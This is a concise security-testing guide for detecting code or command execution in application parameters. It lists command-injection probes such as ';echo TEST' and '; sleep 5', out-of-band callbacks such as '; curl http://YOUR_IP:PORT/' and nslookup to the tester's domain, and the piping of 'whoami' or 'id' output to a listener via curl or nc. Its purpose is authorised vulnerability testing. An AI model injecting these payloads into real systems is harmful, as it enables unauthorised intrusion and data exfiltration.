
## Generic "Possible Code Execution" Test Flow
**Goal:** Decide quickly if a parameter is just data, or being executed (code / shell).

### 1. Baseline
- Send a completely normal value the app expects.
- Note: response body, status code, and response time.

### 2. Harmless syntax poke
Try to see if the value is treated as an expression or command:
- For “number-like” fields:  
  - Send: `1+1`, `2*3`, `0||1`
  - If the app behaves as if the **result** was sent (e.g. `2` or `6`), it’s likely being evaluated.
- For “string/command-like” fields:  
  - Add characters like: `;`, `&&`, `||`, `'`, `"`  
    - e.g. `originalValue;echo TEST`, `originalValue && echo TEST`

**Watch for:**
- Syntax/parse errors instead of normal validation errors.
- Stack traces or interpreter error messages.
- Different behavior that only makes sense if something got executed.

### 3. Time-based probe (safe & universal)
If you suspect OS command or DB/logic eval:
- Inject something that **only adds delay**, like:
  - `; sleep 5` (shell)
  - SQL time functions if it looks like SQLi (`SLEEP(5)`, etc.)
- Measure response time:
  - If the response is consistently ~5s slower → strong indicator that your payload is being executed.

### 4. Out-of-band (OOB) proof
To confirm *remote* code/command execution without touching local data:
- Inject a command that makes the server **call you**:
  - e.g. `; nslookup <token>.yourdomain`  
  - or `; curl http://YOUR_IP:PORT/`
- Watch:
  - DNS logs, HTTP server logs, or `nc` listener on your box.
- If you see the callback → **RCE confirmed**.

### 5. Low-impact data proof (optional)
Once you’re sure something is executing:
- Run a **non-destructive** info command and send its output OOB:
  - e.g. `id`, `whoami`, `uname -a` piped into `curl`/`nc` to your box.
- This confirms:
  - You control arguments
  - You can read command output

> After that point, stop and report / plan carefully — you’ve proven the vuln. Turning it into a full shell is exploitation, not just testing.
